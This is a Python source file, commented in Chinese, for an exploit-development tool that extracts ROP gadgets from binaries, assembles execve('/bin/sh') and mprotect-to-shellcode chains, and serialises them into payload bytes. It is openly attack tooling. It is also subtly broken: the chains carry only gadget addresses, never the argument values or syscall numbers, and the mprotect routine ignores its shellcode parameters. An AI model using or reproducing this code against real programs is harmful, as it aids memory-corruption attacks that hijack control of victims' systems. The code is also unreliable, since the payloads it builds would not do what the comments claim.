# 2026-07-22
# ROP链合成器 — 从二进制字节码中自动提取gadget并组装成利用链(execve/mprotect)
# 设计思路：Capstone反汇编→向后扫描RET指令→按长度(2-5条指令)提取gadget→按功能分类→贪心匹配
# 权衡：Capstone不可用时回退到常见gadget字节模式匹配，覆盖主流编译结果但非完备

from dataclasses import dataclass, field
from typing import List, Optional, Tuple, Dict
import struct

# 尝试导入capstone
try:
    from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_MODE_32
    _HAS_CAPSTONE = True
except ImportError:
    _HAS_CAPSTONE = False


@dataclass
class Gadget:
    address: int
    instructions: List[str]
    category: str
    affected_regs: List[str]
    bytes_sequence: bytes = b""


# //// 常见gadget字节签名 (fallback模式) ////
# 基于编译产物中高频出现的ROP gadget片段
_PATTERN_POP_RDI = bytes([0x5F])              # pop rdi
_PATTERN_POP_RSI = bytes([0x5E])              # pop rsi
_PATTERN_POP_RDX = bytes([0x5A])              # pop rdx
_PATTERN_POP_RAX = bytes([0x58])              # pop rax
_PATTERN_POP_RCX = bytes([0x59])              # pop rcx
_PATTERN_POP_RBX = bytes([0x5B])              # pop rbx
_PATTERN_RET = bytes([0xC3])                  # ret
_PATTERN_SYSCALL = bytes([0x0F, 0x05])        # syscall
_PATTERN_INT80 = bytes([0xCD, 0x80])          # int 0x80
_PATTERN_XCHG_EAX_ESP = bytes([0x94, 0xC3])   # xchg eax, esp; ret
_PATTERN_XCHG_RAX_RSP = bytes([0x48, 0x94, 0xC3])  # xchg rax, rsp; ret
_PATTERN_POP_RSP = bytes([0x5C, 0xC3])        # pop rsp; ret
_PATTERN_JMP_RAX = bytes([0xFF, 0xE0])        # jmp rax
_PATTERN_CALL_RAX = bytes([0xFF, 0xD0])       # call rax


class ROPSynthesizer:

    def __init__(self, arch: str = 'x64', bad_bytes: Optional[List[int]] = None):
        self._arch = arch
        self._bad_bytes = set(bad_bytes) if bad_bytes else set()
        self._capstone_available = _HAS_CAPSTONE

        if _HAS_CAPSTONE:
            if arch == 'x64':
                self._md = Cs(CS_ARCH_X86, CS_MODE_64)
            else:
                self._md = Cs(CS_ARCH_X86, CS_MODE_32)
            self._md.detail = True
        else:
            self._md = None

        # gadget分类标签 — 用于后续链合成时的语义匹配
        self._category_keywords = {
            'pop_reg': ['pop '],
            'syscall': ['syscall', 'int 0x80'],
            'stack_pivot': ['xchg', 'pop rsp', 'pop esp', 'leave'],
            'mem_read': ['mov ', 'ldr'],
            'mem_write': ['mov ', 'str'],
            'call_reg': ['call '],
            'jmp_reg': ['jmp '],
        }

    # ===== gadget搜索 =====

    def find_gadgets(self, data: bytes, base_addr: int = 0) -> List[Gadget]:
        """从二进制数据中扫描所有RET-terminated gadget"""
        if self._capstone_available:
            return self._find_gadgets_capstone(data, base_addr)
        else:
            return self._find_gadgets_fallback(data, base_addr)

    def _find_gadgets_capstone(self, data: bytes, base_addr: int) -> List[Gadget]:
        """Capstone反汇编路径 — 精确且全面"""
        _gadgets = []
        _seen: Dict[int, bool] = {}

        # 先完整反汇编
        _insns = list(self._md.disasm(data, base_addr))
        _ret_offsets = []
        for _i, _insn in enumerate(_insns):
            if _insn.mnemonic == 'ret' or (_insn.mnemonic == 'int' and _insn.op_str == '0x80'):
                _ret_offsets.append(_i)

        # 从每个RET向前回溯，提取2-5条指令构成gadget
        for _ret_idx in _ret_offsets:
            for _depth in range(2, 6):  # 2到5条指令
                _start = _ret_idx - _depth + 1
                if _start < 0:
                    continue
                _gadget_insns = _insns[_start:_ret_idx + 1]

                # 跳过含非法指令的序列 (capstone可能解析出db/dd等)
                if any(i.mnemonic in ('db', 'dd', 'dw', 'invalid') for i in _gadget_insns):
                    continue

                _gadget_addr = _gadget_insns[0].address
                if _gadget_addr in _seen:
                    continue
                _seen[_gadget_addr] = True

                _g_bytes = data[_gadget_addr - base_addr:_gadget_insns[-1].address - base_addr + _gadget_insns[-1].size]

                if self._has_bad_bytes(_g_bytes):
                    continue

                _instrs = [f"{i.mnemonic} {i.op_str}".strip() for i in _gadget_insns]
                _cat = self.classify_gadget_from_text(_instrs)
                _regs = self._extract_affected_regs(_instrs)

                _gadgets.append(Gadget(
                    address=_gadget_addr,
                    instructions=_instrs,
                    category=_cat,
                    affected_regs=_regs,
                    bytes_sequence=_g_bytes
                ))

        return _gadgets

    def _find_gadgets_fallback(self, data: bytes, base_addr: int) -> List[Gadget]:
        """fallback模式 — 字节模式匹配常见gadget"""
        _gadgets = []
        _d = data

        # 收集所有RET位置
        _ret_positions = []
        _pos = 0
        while _pos < len(_d):
            _rp = _d.find(_PATTERN_RET, _pos)
            if _rp == -1:
                break
            _ret_positions.append(_rp)
            _pos = _rp + 1

        # 从每个RET向前匹配已知gadget模式
        _pop_regs = [
            (0x58, 0x5F, 'rax'),  # pop rax...pop rdi (0x58-0x5f)
        ]
        _pop_names = ['rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi']

        for _ret_pos in _ret_positions:
            _gadget_start = max(0, _ret_pos - 6)
            _window = _d[_gadget_start:_ret_pos + 1]

            # pop reg; ret 模式
            for _off in range(len(_window) - 1):
                _b = _window[_off]
                if 0x58 <= _b <= 0x5F:
                    _pop_idx = _b - 0x58
                    _reg = _pop_names[_pop_idx]
                    if _off + 2 <= len(_window) and _window[_off + 1] == 0xC3:
                        _addr = base_addr + _gadget_start + _off
                        _g_bytes = bytes([_b, 0xC3])
                        if not self._has_bad_bytes(_g_bytes):
                            _gadgets.append(Gadget(
                                address=_addr,
                                instructions=[f"pop {_reg}", "ret"],
                                category="pop_reg",
                                affected_regs=[_reg],
                                bytes_sequence=_g_bytes
                            ))

            # pop rdi + ret (单pop长一些)
            for _off in range(len(_window) - 3):
                _b = _window[_off]
                if 0x58 <= _b <= 0x5F:
                    _reg1 = _pop_names[_b - 0x58]
                    _b2 = _window[_off + 1]
                    if 0x58 <= _b2 <= 0x5F and _window[_off + 2] == 0xC3:
                        _reg2 = _pop_names[_b2 - 0x58]
                        _addr = base_addr + _gadget_start + _off
                        _g_bytes = bytes([_b, _b2, 0xC3])
                        if not self._has_bad_bytes(_g_bytes):
                            _gadgets.append(Gadget(
                                address=_addr,
                                instructions=[f"pop {_reg1}", f"pop {_reg2}", "ret"],
                                category="pop_reg",
                                affected_regs=[_reg1, _reg2],
                                bytes_sequence=_g_bytes
                            ))

            # pop reg; pop reg; pop reg; ret
            for _off in range(len(_window) - 4):
                _b1 = _window[_off]
                _b2 = _window[_off + 1]
                _b3 = _window[_off + 2]
                if (0x58 <= _b1 <= 0x5F and 0x58 <= _b2 <= 0x5F
                        and 0x58 <= _b3 <= 0x5F and _window[_off + 3] == 0xC3):
                    _regs = [_pop_names[_b1 - 0x58], _pop_names[_b2 - 0x58], _pop_names[_b3 - 0x58]]
                    _addr = base_addr + _gadget_start + _off
                    _g_bytes = bytes([_b1, _b2, _b3, 0xC3])
                    if not self._has_bad_bytes(_g_bytes):
                        _gadgets.append(Gadget(
                            address=_addr,
                            instructions=[f"pop {_regs[0]}", f"pop {_regs[1]}", f"pop {_regs[2]}", "ret"],
                            category="pop_reg",
                            affected_regs=_regs,
                            bytes_sequence=_g_bytes
                        ))

            # syscall; ret
            _sc_pos = _window.find(_PATTERN_SYSCALL)
            while _sc_pos != -1:
                if _sc_pos + 3 <= len(_window) and _window[_sc_pos + 2] == 0xC3:
                    _addr = base_addr + _gadget_start + _sc_pos
                    _g_bytes = bytes([0x0F, 0x05, 0xC3])
                    if not self._has_bad_bytes(_g_bytes):
                        _gadgets.append(Gadget(
                            address=_addr,
                            instructions=["syscall", "ret"],
                            category="syscall",
                            affected_regs=["rax", "rdi", "rsi", "rdx"],
                            bytes_sequence=_g_bytes
                        ))
                _sc_pos = _window.find(_PATTERN_SYSCALL, _sc_pos + 1)

            # xchg eax,esp; ret (栈迁移)
            _pivot = _window.find(_PATTERN_XCHG_EAX_ESP)
            if _pivot != -1:
                _addr = base_addr + _gadget_start + _pivot
                _g_bytes = _PATTERN_XCHG_EAX_ESP
                if not self._has_bad_bytes(_g_bytes):
                    _gadgets.append(Gadget(
                        address=_addr,
                        instructions=["xchg eax, esp", "ret"],
                        category="stack_pivot",
                        affected_regs=["eax", "esp"],
                        bytes_sequence=_g_bytes
                    ))

        return _gadgets

    # ===== gadget分类 =====
    def classify_gadget_from_text(self, instructions: List[str]) -> str:
        """基于指令文本做语义分类 — 多重标签取优先级最高的"""
        _text = ' '.join(instructions).lower()
        # pop reg 优先 (最常用)
        _pop_count = _text.count('pop ')
        if _pop_count >= 1 and 'ret' in _text:
            return 'pop_reg'
        if 'syscall' in _text or 'int 0x80' in _text:
            return 'syscall'
        if 'xchg' in _text and ('esp' in _text or 'rsp' in _text):
            return 'stack_pivot'
        if 'leave' in _text and 'ret' in _text:
            return 'stack_pivot'
        if 'call ' in _text and any(r in _text for r in ('rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi')):
            return 'call_reg'
        if 'jmp ' in _text and any(r in _text for r in ('rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi')):
            return 'jmp_reg'
        return 'mem_read'  # 默认当作内存操作gadget

    def classify_gadget(self, gadget: Gadget) -> str:
        """对已有Gadget对象做分类"""
        return self.classify_gadget_from_text(gadget.instructions)

    # //// execve链合成 ////
    def synthesize_execve_chain(self, gadgets: List[Gadget]) -> Optional[List[Gadget]]:
        """组装 execve("/bin/sh", NULL, NULL) ROP链
        需要: pop rdi; ret, pop rsi; ret, pop rdx; ret, pop rax; ret, syscall; ret
        设计理由: 贪心先匹配完整组合(多pop)，不够再单pop拼接
        """
        _pop_rdi = self._find_pop_gadget(gadgets, 'rdi')
        _pop_rsi = self._find_pop_gadget(gadgets, 'rsi')
        _pop_rdx = self._find_pop_gadget(gadgets, 'rdx')
        _pop_rax = self._find_pop_gadget(gadgets, 'rax')
        _syscall = self._find_syscall_gadget(gadgets)

        # 检查所有必需gadget是否存在
        _missing = []
        if not _pop_rdi:
            _missing.append('pop rdi')
        if not _pop_rsi:
            _missing.append('pop rsi')
        if not _pop_rdx:
            _missing.append('pop rdx')
        if not _pop_rax:
            _missing.append('pop rax')
        if not _syscall:
            _missing.append('syscall')

        if _missing:
            return None

        _chain = [
            _pop_rdi,
            _pop_rsi,
            _pop_rdx,
            _pop_rax,
            _syscall,
        ]
        return _chain

    # //// mprotect链合成 ////
    def synthesize_mprotect_chain(self, gadgets: List[Gadget],
                                  shellcode_addr: int, shellcode_len: int) -> Optional[List[Gadget]]:
        """组装 mprotect(addr, len, 7) + jmp to shellcode 链
        mprotect syscall: rax=10, rdi=addr, rsi=len, rdx=PROT_RWX(7)
        """
        _pop_rdi = self._find_pop_gadget(gadgets, 'rdi')
        _pop_rsi = self._find_pop_gadget(gadgets, 'rsi')
        _pop_rdx = self._find_pop_gadget(gadgets, 'rdx')
        _pop_rax = self._find_pop_gadget(gadgets, 'rax')
        _syscall = self._find_syscall_gadget(gadgets)
        _jmp_rsp = self._find_gadget_by_cat(gadgets, 'jmp_reg')

        _missing = []
        if not _pop_rdi:
            _missing.append('pop rdi')
        if not _pop_rsi:
            _missing.append('pop rsi')
        if not _pop_rdx:
            _missing.append('pop rdx')
        if not _pop_rax:
            _missing.append('pop rax')
        if not _syscall:
            _missing.append('syscall')

        if _missing:
            return None

        _chain = [
            _pop_rdi,
            _pop_rsi,
            _pop_rdx,
            _pop_rax,
            _syscall,
        ]
        if _jmp_rsp:
            _chain.append(_jmp_rsp)
        return _chain

    # ---- 辅助搜索 ----
    def _find_pop_gadget(self, gadgets: List[Gadget], reg: str) -> Optional[Gadget]:
        """查找 pop <reg>; ret 的gadget，优先匹配干净的单pop"""
        # 严格匹配: instructions以 "pop <reg>" 开头
        _candidates = []
        for _g in gadgets:
            if _g.instructions and _g.instructions[0].strip().lower() == f'pop {reg}':
                _candidates.append(_g)

        if not _candidates:
            # 宽松匹配: 整体指令包含 "pop <reg>"
            for _g in gadgets:
                _text = ' '.join(_g.instructions).lower()
                if f'pop {reg}' in _text:
                    _candidates.append(_g)

        if _candidates:
            # 优先指令最短的
            _candidates.sort(key=lambda g: len(g.instructions))
            return _candidates[0]
        return None

    def _find_syscall_gadget(self, gadgets: List[Gadget]) -> Optional[Gadget]:
        """查找 syscall; ret gadget"""
        for _g in gadgets:
            _text = ' '.join(_g.instructions).lower()
            if 'syscall' in _text or 'int 0x80' in _text:
                return _g
        return None

    def _find_gadget_by_cat(self, gadgets: List[Gadget], category: str) -> Optional[Gadget]:
        for _g in gadgets:
            if _g.category == category:
                return _g
        return None

    def _extract_affected_regs(self, instructions: List[str]) -> List[str]:
        """从指令文本中提取被修改的寄存器名"""
        _regs = set()
        _reg_names = {'rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'rsp', 'rbp',
                      'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15',
                      'eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'esp', 'ebp'}

        for _insn in instructions:
            _parts = _insn.lower().replace(',', ' ').split()
            for _p in _parts:
                if _p in _reg_names:
                    _regs.add(_p)
        return sorted(_regs)

    def _has_bad_bytes(self, data: bytes) -> bool:
        """检查字节序列中是否有坏字符"""
        if not self._bad_bytes:
            return False
        for _b in data:
            if _b in self._bad_bytes:
                return True
        return False

    def _find_ret_gadgets(self, data: bytes) -> List[int]:
        """返回所有0xC3字节偏移"""
        _positions = []
        _off = 0
        while _off < len(data):
            _p = data.find(_PATTERN_RET, _off)
            if _p == -1:
                break
            _positions.append(_p)
            _off = _p + 1
        return _positions

    # ===== payload序列化 =====
    def to_payload(self, chain: List[Gadget]) -> bytes:
        """将gadget链表序列化为ROP payload字节流"""
        _payload = b''
        _fmt = '<Q' if self._arch == 'x64' else '<I'
        for _g in chain:
            _payload += struct.pack(_fmt, _g.address)
        return _payload
